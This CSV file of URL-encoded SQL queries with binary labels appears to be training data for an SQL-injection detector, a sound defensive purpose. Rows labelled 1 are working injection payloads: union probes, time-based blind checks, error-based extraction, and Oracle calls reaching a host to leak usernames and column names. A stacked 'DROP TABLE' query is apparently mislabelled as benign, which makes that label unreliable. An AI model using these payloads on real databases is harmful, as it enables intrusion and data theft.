Query,Label
-7345%25%22%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%22%25%22%20%20%3D%20%20%22,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%208018%20%20%3D%20%208018,1
3.19537E+15,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20wwqj%20where%203249%20%20%3D%20%203249%20and%209254%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20--,1
zahira,0
afasia,0
8.08498E+15,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,1
%7C%7Cutl_http.request%20%20%28%20%20%27httP%3A//192.168.1.1/%27%20%20%29%20%20%7C%7C%27,1
SELECT AVG ( distant ) FROM area SELECT SUM ( show ),0
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM blind WHERE order NOT LIKE 'century%',0
SELECT out ( s )  FROM afternoon,0
giovannina,0
guhl.monks@goscan.za,0
1%20%20%29%20%20%20where%202307%20%20%3D%20%202307,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%207417%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20--,1
SELECT smile FROM river,0
"SELECT Employees.asleep, COUNT ( Orders.furID )  AS gentlyFROM    ( OrdersINNER JOIN necessary ON Orders.wolfID  =  Employees.visitID )",0
95642019s,0
SELECT * FROM count WHERE right = 'tune'  AND City = 'how',0
-9856%22%20union%20all%20select%209753--,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20sleep%20%20%28%20%205%20%20%29%20%20%23,1
-5385%22%20union%20all%20select%204577%2C4577%2C4577%2C4577%2C4577%2C4577%2C4577%23,1
"SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL",0
SELECT * FROM yellow WHERE fill BETWEEN neighborhood09/01/1996free AND than15/31/1996they,0
UNION%20ALL%20SELECT,1
1%22%20or%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%22fbuo%22%20like%20%22fbuo,1
"SELECT form,last FROM break WHERE paragraph = 'summer' UNION SELECT drive, blanket FROM current",0
SELECT * FROM balance WHERE return = 'atomic'  OR neck = 'plant',0
end%20and%20%20%20%28%20%20%22nuix%22%20like%20%22nuix,1
76,0
SELECT * FROM master WHERE at = 'baseball',0
"INSERT INTO with ( leaf, trip, today, life, view, afraid )  VALUES  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )",0
-1791%27%20union%20all%20select%209316%2C9316%2C9316%2C9316%2C9316%2C9316%2C9316%2C9316--,1
1%25%27%20%20%29%20%20%20and%20%20%20%28%20%20select%209067%20from%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%209067%20%20%3D%20%209067%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20information_schema.character_sets%20group%20by%20x%20%20%29%20%20a%20%20%29%20%20%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY,0
almoharn,0
1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,1
-7482%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%209077%20%20%3D%20%202651,1
p5r0i9i5ar,0
SELECT * FROM  ( SELECT serious FROM salt ),0
"burgos, 40, 7?a",0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%201%23%22%3F%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
SELECT COUNT ( whom ) FROM inside,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2712,3146,3152,2720,3078,2766,2679 )  ORDER BY meta_id ASC",0
1%22%20%20%29%20%20%20where%201705%20%20%3D%20%201705,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20ycvh%20where%204523%20%20%3D%20%204523%20and%20sleep%20%20%28%20%205%20%20%29%20%20%23,1
8.32E+15,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20xkiq%20where%209008%20%20%3D%20%209008%20and%20sleep%20%20%28%20%205%20%20%29%20%20--,1
onofre,0
neusy,0
FROM  ( SELECT DISTINCT trunk FROM courage ),0
gupton,0
1%22%20%20%29%20%20%20and%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20and%20%20%20%28%20%20%22nkgd%22%20%20%3D%20%20%22nkgd,1
1%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,1
1%20and%205934%20%20%3D%20%207745,1
"SELECT * FROM certainly ORDER BY dozen, disease",0
1%22%20and%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%22masm%22%20%20%3D%20%20%22masm,1
"omellons, els",0
-4817%20union%20all%20select%207415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%23,1
-9432%20%20%20%29%20%20%20%20%29%20%20%20%20as%20nqya%20where%208387%20%20%3D%20%208387%20or%20elt%20%20%28%20%209242%20%20%3D%20%206180%2C6180%20%20%29%20%20--,1
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes',0
colvara pulve,0
1%27%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208315%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27vjhw%27%20like%20%27vjhw,1
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ),0
tapioles,0
"SELECT plant,press,daughter,sand,connected     (  (  guard JOIN leader ON current.gradually =  better.silence )   INNER JOIN readerON Orders.young =  explain.parallelID )",0
SELECT TOP 3 * FROM frog,0
-2549%27%20%20%29%20%20%20as%20zfnf%20where%201993%20%20%3D%20%201993%20union%20all%20select%201993%2C1993%2C1993%2C1993%2C1993%2C1993--,1
elt%20%20%28%20%202427%20%20%3D%20%202427%2C5518%20%20%29,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%209455%20%20%3D%20%206007%20%20%29%20%20%20then%209455%20else%209455%2A%20%20%28%20%20select%209455%20from%20mysql.db%20%20%29%20%20%20end%20%20%29%20%20%23,1
SELECT * FROM excitement 3 SELECT * FROM railroad,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20bovm%20where%205560%20%20%3D%20%205560%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT plastic ( s )  FROM six,0
"SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",0
SELECT * FROM pan WHERE occasionally BETWEEN '1996-07-01' AND '1996-07-31',0
1%27%20%20%29%20%20%20where%205280%20%20%3D%20%205280%20and%204595%20%20%3D%20%204595%23,1
SELECT belt,0
1%27%20%20%29%20%20%20and%207756%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207756%20%20%3D%20%207756%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%27lnte%27%20%20%3D%20%20%27lnte,1
1%22%20and%20char%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%2077%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2088%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%22pmpk%22%20like%20%22pmpk,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208466%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x694a4745%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27gbhd%27%20%20%3D%20%20%27gbhd,1
SELECT AVG ( task ) FROM evening SELECT SUM ( heart ),0
rubi de biasi,0
SELECT * FROM Users WHERE UserId  =  105; DROP TABLE Suppliers;,0
SELECT AVG ( car ) FROM breeze,0
-9574%27%20%20%29%20%20%20as%20rxym%20where%204719%20%20%3D%20%204719%20union%20all%20select%204719%2C4719%2C4719%2C4719%2C4719%2C4719%2C4719--,1
"SELECT * FROM went WHERE musical NOT IN  ( 'jack', 'settle', 'eaten' )",0
1%20%20%29%20%20%20or%202633%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%7C%7Cchr%20%20%28%20%20103%20%20%29%20%20%2C5%20%20%29,1
ardevol herrador,0
fortner,0
1%27%20%20%29%20%20%20as%20mara%20where%207164%20%20%3D%20%207164,1
-3598%20%20%29%20%20%20union%20all%20select%202264%23,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%205356%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%202394%20%20%3D%20%204530%20%20%29%20%20%20then%202394%20else%202394%2A%20%20%28%20%20select%202394%20from%20information_schema.character_sets%20%20%29%20%20%20end%20%20%29%20%20%23,1
"SELECT speedID AS ID, win AS proper FROM add",0
63482988k,0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull--,1
"passeig picasso, 23,",0
-8791%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20make_set%20%20%28%20%206681%20%20%3D%20%206620%2C6620%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22pvdk%22%20%20%3D%20%20%22pvdk,1
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
-9577%27%7C%7C%20%20%28%20%20select%20%27vloa%27%20from%20dual%20where%207184%20%20%3D%20%207184%20union%20all%20select%207184%2C7184%23,1
1%27%20%20%29%20%20%20as%20xhmm%20where%208092%20%20%3D%20%208092%20union%20all%20select%20null%2Cnull%2Cnull--,1
call%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%202385%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
1%20and%208312%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2069%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%7C%7Cchr%20%20%28%20%2068%20%20%29%20%20%2C5%20%20%29%20%20--,1
SELECT COUNT ( exact ) FROM pound,0
calle bendicion 160,0
"SELECT ADDTIME ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0
SELECT MIN ( being )  AS pie FROM call,0
WHERE ProductID  =  ALL  ( SELECT ProductID FROM OrderDetails WHERE Quantity  =  10 ) ;,0
jiyuan,0
-9462%22%20%20%29%20%20%20as%20vzga%20where%204799%20%20%3D%20%204799%20or%208691%20%20%3D%20%201048,1
9.0515E+15,0
17120,0
"SELECT * FROM station ORDER BY bark, won",0
select%20pg_sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%204382%20%20%3D%20%204382,1
1%27%20%20%29%20%20%20where%204407%20%20%3D%20%204407%20and%20char%20%20%28%20%20107%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2080%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
1%27%2B%20%20%28%20%20select%20%27ycsv%27%20where%203628%20%20%3D%20%203628%20and%20char%20%20%28%20%20107%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2080%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
2260,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%25%26%22%20or%201%20%20%3D%20%201%20--%201,1
SELECT AVG ( Price ) FROM silk,0
g66uin2,0
SELECT store ( s )  FROM mail,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%206414%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27rqbf%27%20%20%3D%20%20%27rqbf,1
SELECT * FROM finish 3 SELECT * FROM pale,0
"SELECT CustomerName, CONCAT ( Address,', ',PostalCode,', ',City,', ',Country )  AS Address FROM Customers;",0
%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%20sleep%20%20%28%20%20__TIME__%20%20%29%20%20%20%20%3D%20%20%22,1
-5547%27%20or%209323%20%20%3D%20%209323%23,1
santiago de la puebla,0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%208514%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
1%27%2B%20%20%28%20%20select%20kqac%20where%204362%20%20%3D%20%204362%20and%208312%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2069%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%7C%7Cchr%20%20%28%20%2068%20%20%29%20%20%2C5%20%20%29%20%20--,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%201%23%22%3F%20or%201%20%20%3D%20%201%20--%201,1
AND%201%20%20%3D%20%20utl_inaddr.get_host_address%20%20%20%28%20%20%20%20%28%20%20%20SELECT%20DISTINCT%20%20%28%20%20column_name%20%20%29%20%20%20FROM%20%20%20%28%20%20SELECT%20DISTINCT%20%20%28%20%20column_name%20%20%29%20%20%2C%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns%20%20%29%20%20%20WHERE%20LIMIT%20%20%3D%20%202%20%20%20%29%20%20%20%20%29%20%20%20%20AND%20%27i%27%20%20%3D%20%20%27i,1
"SELECT general, hay, environment FROM bicycle WHERE soon  IS NULL",0
"SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID )",0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0
1%27%2B%20%20%28%20%20select%20%27wkcq%27%20where%201020%20%20%3D%20%201020%20and%202388%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x6d457153%20%20%20%29%20%20%20%20%29%20%20%20%23,1
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ),0
maeya,0
1%22%20and%208407%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%22zwov%22%20%20%3D%20%20%22zwov,1
donhierro,0
SELECT future ( s FROM hunt RIGHT JOIN,0
"SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2874' LIMIT 1,0
1%25%27%20%20%29%20%20%20and%206537%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2076%20%20%29%20%20%7C%7Cchr%20%20%28%20%20116%20%20%29%20%20%7C%7Cchr%20%20%28%20%20117%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%2C5%20%20%29%20%20%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',0
1%27%7C%7C%20%20%28%20%20select%20%27gikt%27%20where%208447%20%20%3D%20%208447%20or%201022%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
graupere trabucco,0
SELECT AVG ( save ) FROM require,0
1%27%20and%206537%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2076%20%20%29%20%20%7C%7Cchr%20%20%28%20%20116%20%20%29%20%20%7C%7Cchr%20%20%28%20%20117%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%2C5%20%20%29,1
villanueva gualano,0
1%20%20%29%20%20%20as%20estm%20where%204809%20%20%3D%20%204809%20union%20all%20select%20null%2Cnull%2Cnull--,1
pablo,0
8.5138E+15,0
1%22%20%20%29%20%20%20as%20pxdq%20where%202236%20%20%3D%20%202236%20and%202006%20%20%3D%20%202006,1
1%25%22%20%20%29%20%20%20and%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
-6200%27%20where%209150%20%20%3D%20%209150%20union%20all%20select%209150%2C9150%2C9150%2C9150%2C9150%2C9150%2C9150%23,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20elt%20%20%28%20%203114%20%20%3D%20%203114%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%23,1
46183,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%203580%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
"SELECT EXTRACT ( WEEK FROM ""2017-06-15"" ) ;",0
SELECT AVG ( Price ) FROM consist,0
"calle las artes, 90,",0
SELECT TOP 3 * FROM among WHERE cook = 'someone' SELECT * FROM chance,0
1.8461E+15,0
1%25%22%20%20%29%20%20%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
puntallana,0
SELECT DISTINCT chicken FROM traffic,0
guasca,0
AND%201%20%20%3D%20%20utl_inaddr.get_host_address%20%20%20%28%20%20%20%20%28%20%20%20SELECT%20DISTINCT%20%20%28%20%20USERNAME%20%20%29%20%20%20FROM%20%20%20%28%20%20SELECT%20DISTINCT%20%20%28%20%20USERNAME%20%20%29%20%20%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%20%20%29%20%20%20WHERE%20LIMIT%20%20%3D%20%204%20%20%20%29%20%20%20%20%29%20%20%20%20AND%20%27i%27%20%20%3D%20%20%27i,1
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%',0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%20%271%27%20union%20select%20%20%20%28%20%20%5C.%20%20%29%20%20%2C%40%40VERSION%20--%201%27,1
vasilescu.lisi@drogasvirtuales.sc,0
SELECT * FROM area FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
SELECT * FROM accept FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cabin,0
"SELECT brave,package,these,raw,result     (  (  large JOIN also ON way.collect =  wall.difficult )   INNER JOIN proudON Orders.farm =  pipe.certainlyID )",0
-1106%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%202855%2C2855%2C2855%2C2855%2C2855%2C2855%2C2855%23,1
SELECT * FROM pretty WHERE up  BETWEEN 10 AND 20,0
3.16361E+15,0
SELECT DISTINCT wonderful FROM courage,0
-5198%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%207089%2C7089%2C7089%2C7089%2C7089%2C7089%2C7089%2C7089%23,1
calle fausto fraile 0,0
1%22%20where%207015%20%20%3D%20%207015,1
SELECT COUNT ( distantID ) FROM born,0
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
7.05723E+15,0
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0
28614822q,0
-8040%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20make_set%20%20%28%20%203916%20%20%3D%20%206787%2C6787%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22laar%22%20like%20%22laar,1
weldon@latiendadecolchones.ec,0
-6081%20where%203681%20%20%3D%20%203681%20or%202603%20%20%3D%20%203138--,1
"c/ arbitro eduardo vidal torres, 12, 4c",0
sugesto,0
SELECT AVG ( mark ) FROM crew SELECT SUM ( mine ),0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20rlike%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204207%20%20%3D%20%201757%20%20%29%20%20%20then%201%20else%200x28%20end%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
"SELECT gone,lunch,rush,repeat,cup     (  (  colony JOIN spend ON quickly.sink =  cup.relationship )   INNER JOIN properON Orders.instrument =  hurt.speechID )",0
